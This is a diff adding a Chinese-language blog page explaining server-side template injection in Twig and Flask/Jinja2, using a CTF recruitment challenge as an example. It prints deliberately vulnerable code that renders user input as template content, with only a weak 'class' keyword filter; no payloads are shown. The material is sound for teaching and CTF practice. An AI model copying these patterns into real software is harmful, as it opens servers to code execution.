@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="N0rth3ty">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="N0rth3ty">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="每一顶白帽都有一道黑边">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>浅析SSTI · N0rth3ty&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/img/a.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >N0rth3ty&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">浅析SSTI</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>N0rth3ty's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/img/02.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            浅析SSTI
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.8k</span>阅读时长: <span class="post-count reading-time">18 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/17</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>Server-side Template Injection（简称SSTI）是服务端模板注入攻击，和常见的web注入一样，是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<p>利用的难点也在于对使用的模板引擎的判断<br><img src="/img/8_2.jpg" alt="image"><br>本文主要讲Flask框架的jinja2模板<br><a id="more"></a>  </p>
+<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>一段php的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;&#123;name&#125;&#125;"</span>, <span class="keyword">array</span>(<span class="string">"name"</span> =&gt; $_GET[<span class="string">"name"</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure></p>
+<p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。<br>显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击。  </p>
+<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure></p>
+<p>对比上面两种情况，简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的  </p>
+<p>这是一段网站404的代码，采用的是jinjia2的模板<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    template = <span class="string">'''&#123;%% extends "layout.html" %%&#125;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class="center-content error"&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">'''</span> % (request.url)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br></pre></td></tr></table></figure></p>
+<p>这段代码没有从模板文件而是用 render_template_string() 直接从一个字符串渲染到了html.<br>从模板文件还是从字符串倒不是什么大问题, 主要是它渲染的那个字符串是和用户的输入(request.url)拼接过的. 要知道这里的 template 存的并不是纯数据而是有一部分控制功能在里面的.<br>这就产生了代码域与数据域的混淆, 只要出现了这样的情况十有八九就会有洞. 首先最直接的, html模板渲染到html, 插入到html就肯定会有XSS.  </p>
+<p>然后就是构成SSTI，html模板并不仅仅是html, 还有能被模板渲染引擎解释的模板代码, 这样一来我们就能插入在服务器端执行的代码.  </p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>CNSS招新题目有一道SSTI<br>采用的flask/jinjia2<br>会根据name参数渲染模板,来看一下这道题<br>这是题目源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string, request, redirect</span><br><span class="line"></span><br><span class="line">head = <span class="string">r'''</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;BeatingHeart&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;link rel="stylesheet" href="/static/css/normalize.css"&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.console = window.console || function(t) &#123;&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;body translate="no"&gt;</span></span><br><span class="line"><span class="string">&lt;script src="/static/js/jquery.js"&gt;&lt;/script&gt; </span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">      (function () &#123;</span></span><br><span class="line"><span class="string">    var openComment, styles, time, writeStyleChar, writeStyles;</span></span><br><span class="line"><span class="string">    styles = '/* \n * "Myself" v1.0.5\n * Robot rights protected under BOT License\n * Authored by pen#PwLXXP\n */\n\nbody &#123;\n  background-color: #1a1c24; color: #fff;\n  font-size: 13px; line-height: 1.4;\n  -webkit-font-smoothing: subpixel-antialiased;\n&#125;\n\n/* ...                  \n *\n * ...hello?            \n *\n * Oh hai guys! It\'s me, blacsheep.    \n *\n * I\'m just sitting here coding away.            \n *\n * Sure, you can watch.                       \n *\n *\n * This CSS is being injected into a DOM &lt;style&gt; element \n * and written in this &lt;pre&gt; element simultaneously.        \n *\n * Confused? Watch!\n *\n */\n\npre &#123; \n  position: fixed; width: 48%;\n  top: 30px; bottom: 30px; left: 26%;\n  transition: left 500ms;\n  overflow: auto;\n  background-color: #313744; color: #a6c3d4;\n  border: 1px solid rgba(0,0,0,0.2);\n  padding: 24px 12px;\n  box-sizing: border-box;\n  border-radius: 3px;\n  box-shadow: 0px 4px 0px 2px rgba(0,0,0,0.1);\n&#125;\n\n\n/* \n * Syntax highlighting \n * Colors based on Base16 Ocean Dark\n */\n\npre em:not(.comment) &#123; font-style: normal; &#125;\n\n.comment       &#123; color: #707e84; &#125;\n.selector      &#123; color: #c66c75; &#125;\n.selector .key &#123; color: #c66c75; &#125;\n.key           &#123; color: #c7ccd4; &#125;\n.value         &#123; color: #d5927b; &#125;\n\n\n/* \n * Let\'s build my little pen heart.\n */ \n\n\n/* First, we\'ll move this s*** over */\n\npre &#123; left: 50%; &#125;\n\n\n/* Now we can build my heart */\n\n#heart, #echo &#123; \n  position: fixed;\n  width: 300px; height: 300px;\n  top: calc(50% - 150px); left: calc(25% - 150px);\n  text-align: center;\n  -webkit-transform: scale(0.95);\n          transform: scale(0.95);\n&#125;\n\n#heart &#123; z-index: 8; &#125;\n#echo  &#123; z-index: 7; &#125;\n\n#heart::before, #heart::after, #echo::before, #echo::after &#123;\n    content: \'\';\n    position: absolute;\n    top: 40px;\n    width: 150px; height: 240px;\n    background: #c66c75;\n    border-radius: 150px 150px 0 0;\n    -webkit-transform: rotate(-45deg);\n            transform: rotate(-45deg);\n    -webkit-transform-origin: 0 100%;\n            transform-origin: 0 100%;\n&#125;\n\n#heart::before, #echo::before &#123;\n  left: 150px;\n&#125;\n\n#heart::after, #echo::after &#123;\n  left: 0;\n  -webkit-transform: rotate(45deg);\n          transform: rotate(45deg);\n  -webkit-transform-origin: 100% 100%;\n          transform-origin: 100% 100%;\n&#125;\n\n\n/* It needs some depth  */\n\n#heart::after &#123; \n  box-shadow:\n    inset -6px -6px 0px 6px rgba(255,255,255,0.1);\n&#125;\n\n#heart::before &#123; \n  box-shadow:\n    inset 6px 6px 0px 6px rgba(255,255,255,0.1);\n&#125;\n\n\n/* Makin it mine. */\n\n#heart i::before &#123;\n  content: \'''</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">template = "&#123;myname&#125;"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foot = r'</span><span class="string">''</span>\<span class="string">';\n  position: absolute;\n  z-index: 9;\n  width: 100%;\n  top: 35%; left: 0;\n  font-style: normal;\n  color: rgba(255,255,255,0.8);\n  font-weight: 100;\n  font-size: 30px;\n  text-shadow: -1px -1px 0px rgba(0,0,0,0.2);\n&#125;\n\n\n/* \n * Hearts gotta beat. \n */\n\n@-webkit-keyframes heartbeat &#123;\n  0%, 100% &#123; \n    -webkit-transform: scale(0.95); \n            transform: scale(0.95); \n  &#125;\n  50% &#123; \n    -webkit-transform: scale(1.00); \n            transform: scale(1.00); \n  &#125;\n&#125;\n\n@keyframes heartbeat &#123;\n  0%, 100% &#123; transform: scale(0.95); &#125;\n  50%      &#123; transform: scale(1.00); &#125;\n&#125;\n\n@-webkit-keyframes echo &#123;\n  0%   &#123; \n    opacity: 0.1;\n    -webkit-transform: scale(1);\n            transform: scale(1);\n  &#125;\n  100% &#123; \n    opacity: 0;\n    -webkit-transform: scale(1.4);\n            transform: scale(1.4);\n  &#125;\n&#125;\n\n@keyframes echo &#123;\n  0%   &#123; \n    opacity: 0.1;\n    transform: scale(1);\n  &#125;\n  100% &#123; \n    opacity: 0;\n    transform: scale(1.4);\n  &#125;\n&#125;\n\n\n/* \n * Beautiful! Now for the beating...\n */\n\n#heart, #echo &#123;\n  -webkit-animation-duration: 2000ms;\n          animation-duration: 2000ms;\n  -webkit-animation-timing-function: \n    cubic-bezier(0, 0, 0, 1.74);\n          animation-timing-function: \n            cubic-bezier(0, 0, 0, 1.74);\n  -webkit-animation-delay: 500ms;\n          animation-delay: 500ms;\n  -webkit-animation-iteration-count: infinite;\n          animation-iteration-count: infinite;\n  -webkit-animation-play-state: paused;\n          animation-play-state: paused;\n&#125;\n\n#heart &#123; \n  -webkit-animation-name: heartbeat; \n          animation-name: heartbeat; \n&#125;\n#echo &#123; \n  -webkit-animation-name: echo; \n          animation-name: echo; \n&#125;\n\n\n/* \n * Ready...           \n */\n\n#heart, #echo &#123;\n\n/* \n * ...set...          \n */\n  \n  -webkit-animation-play-state: running;\n          animation-play-state: running;\n  \n/* \n * ...beat!        \n */\n  \n&#125;\n\n/* \n *\n * Wahoo!         \n *\n * We did it!       \n *\n * I mean *I* did it, but you know, whatever...\n * jake albaugh definitely did not have anything \n * to do with this.\n *\n * This pen loves CodePen!       \n * \n * See you later!\n *  \n */'</span>;</span><br><span class="line">    openComment = false;</span><br><span class="line">    writeStyleChar = function (which) &#123;</span><br><span class="line">        <span class="keyword">if</span> (which === <span class="string">'/'</span> &amp;&amp; openComment === false) &#123;</span><br><span class="line">            openComment = true;</span><br><span class="line">            styles = $(<span class="string">'#style-text'</span>).html() + which;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (which === <span class="string">'/'</span> &amp;&amp; openComment === true) &#123;</span><br><span class="line">            openComment = false;</span><br><span class="line">            styles = $(<span class="string">'#style-text'</span>).html().replace(/(\/[^\/]*\*)$/, <span class="string">'&lt;em class="comment"&gt;$1/&lt;/em&gt;'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (which === <span class="string">':'</span>) &#123;</span><br><span class="line">            styles = $(<span class="string">'#style-text'</span>).html().replace(/([a-zA-Z- ^\n]*)$/, <span class="string">'&lt;em class="key"&gt;$1&lt;/em&gt;:'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (which === <span class="string">';'</span>) &#123;</span><br><span class="line">            styles = $(<span class="string">'#style-text'</span>).html().replace(/([^:]*)$/, <span class="string">'&lt;em class="value"&gt;$1&lt;/em&gt;;'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (which === <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">            styles = $(<span class="string">'#style-text'</span>).html().replace(/(.*)$/, <span class="string">'&lt;em class="selector"&gt;$1&lt;/em&gt;&#123;'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            styles = $(<span class="string">'#style-text'</span>).html() + which;</span><br><span class="line">        &#125;</span><br><span class="line">        $(<span class="string">'#style-text'</span>).html(styles);</span><br><span class="line">        <span class="keyword">return</span> $(<span class="string">'#style-tag'</span>).append(which);</span><br><span class="line">    &#125;;</span><br><span class="line">    writeStyles = function (message, index, interval) &#123;</span><br><span class="line">        var pre;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; message.length) &#123;</span><br><span class="line">            pre = document.getElementById(<span class="string">'style-text'</span>);</span><br><span class="line">            pre.scrollTop = pre.scrollHeight;</span><br><span class="line">            writeStyleChar(message[index++]);</span><br><span class="line">            <span class="keyword">return</span> setTimeout(function () &#123;</span><br><span class="line">                <span class="keyword">return</span> writeStyles(message, index, interval);</span><br><span class="line">            &#125;, interval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    $(<span class="string">'body'</span>).append(<span class="string">'  &lt;style id="style-tag"&gt;&lt;/style&gt;\n&lt;span id="echo"&gt;&lt;/span&gt;\n&lt;span id="heart"&gt;&lt;i&gt;&lt;/i&gt;&lt;/span&gt;\n&lt;pre id="style-text"&gt;&lt;/pre&gt;'</span>);</span><br><span class="line">    time = window.innerWidth &lt;= 578 ? 4 : 16;</span><br><span class="line">    writeStyles(styles, <span class="number">0</span>, time);</span><br><span class="line">&#125;.call(this));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route("/")</span></span><br><span class="line"><span class="string">def index():</span></span><br><span class="line"><span class="string">    name = request.args.get('name')</span></span><br><span class="line"><span class="string">    if not name:</span></span><br><span class="line"><span class="string">        return redirect('/?name=blacsheep')</span></span><br><span class="line"><span class="string">    if "class" in name:</span></span><br><span class="line"><span class="string">        return redirect('/?name=hacker')</span></span><br><span class="line"><span class="string">    html = template.format(myname = name)</span></span><br><span class="line"><span class="string">    return head + render_template_string(html) + foot</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route("/index.php")</span></span><br><span class="line"><span class="string">def egg():</span></span><br><span class="line"><span class="string">    return render_template_string("&lt;center&gt;&lt;h1&gt;What's going on, Young hacker?&lt;/h1&gt;&lt;/center&gt;")</span></span><br></pre></td></tr></table></figure></p>
+<p>套路是老套路，不过题目新意还是足够的<br>核心代码就两行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">html = template.format(myname = name)</span><br><span class="line">return head + render_template_string(html) + foot</span><br></pre></td></tr></table></figure></p>
+<p>使用了格式化字符串去写模板，然后把生成的字符串而不是模板传进去渲染，所以导致了SSTI<br>然后这里过滤掉了class  </p>
